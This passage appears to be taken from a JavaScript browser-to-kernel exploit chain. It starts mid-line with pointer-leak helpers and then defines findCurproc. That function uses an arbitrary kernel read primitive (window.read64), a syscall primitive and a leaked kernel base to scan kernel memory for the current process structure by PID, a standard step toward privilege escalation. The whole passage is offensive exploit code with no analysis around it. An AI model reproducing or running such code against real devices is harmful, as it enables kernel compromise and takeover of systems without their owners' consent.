    aimCarrier(cand, getpidSlot); var getpidPtr = low48AtRaw(rwView,0);

// ---------- Find current proc ----------
function findCurproc() {
    if (!window.syscall) {
        mark("FIND-CURPROC-FAIL", "syscall not available");
        return 0n;
    }
    const pid = window.syscall(window.SYSCALL.getpid);
    mark("CURRENT-PID", String(pid));

    const start = BigInt(kernelBase) + 0x100000n;
    const end = start + 0x200000n;
    for (let addr = start; addr < end; addr += 0x1000n) {
        const proc = window.read64(addr);
        if (proc < 0xFFFFFFFF00000000n) continue;
        const test_pid = window.read64(proc + 0xbcn);
        if (test_pid === BigInt(pid)) {
            return proc;
        }
    }
    return 0n;
}
